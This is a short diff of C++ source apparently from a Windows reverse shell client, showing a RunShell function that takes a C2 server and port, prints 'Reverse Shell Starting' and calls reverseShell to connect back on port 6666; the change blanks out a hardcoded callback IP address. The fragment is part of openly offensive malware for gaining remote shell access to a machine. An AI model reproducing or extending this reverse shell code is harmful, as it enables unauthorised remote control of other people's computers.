@@ -162,7 +162,7 @@ void RunShell(char* C2Server, int C2Port) {
                 std::cout << "Reverse Shell Starting" << std::endl;
                closesocket(mySocket);
                WSACleanup();
-               char host[] = "192.168.178.102";  
+               char host[] = " ";  
                int port = 6666;
                reverseShell(host, port);
             }
